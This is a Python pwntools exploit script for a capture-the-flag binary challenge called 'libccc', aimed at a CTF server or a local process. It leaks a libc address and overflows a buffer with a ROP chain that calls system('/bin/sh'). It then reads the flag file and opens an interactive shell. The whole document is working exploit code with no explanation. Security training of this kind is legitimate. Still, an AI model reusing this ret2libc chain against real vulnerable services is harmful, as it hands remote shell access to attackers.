#!/usr/bin/python3

from pwn import *
import sys

bname = './libccc'
context.binary = bname
e = ELF(bname)
libc = ELF('./libc.so.6')

if len(sys.argv) > 1:
    r = remote('ctf.adl.tw', 11004)
    #context.log_level = 'debug'
else:
    r = process(bname, env={"LD_PRELOAD": "./libc.so.6"})
    libc = ELF('./libc.so.6')

libc_addr = u64(r.recvline()[:6].ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdin_']
print(hex(libc_addr))

system_addr = libc.symbols['__libc_system'] + libc_addr
#print(hex(system_addr))
bin_sh = next(libc.search(b'/bin/sh')) + libc_addr
pop_rdi_ret = 0x000000000002155f + libc_addr # remote
ret = 0x00000000000008aa + libc_addr # remote
input()
r.send(b'A'*0x40)
r.send(b'A'*0x8 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr))
input()
r.sendline('cat /home/`whoami`/flag')
r.interactive()
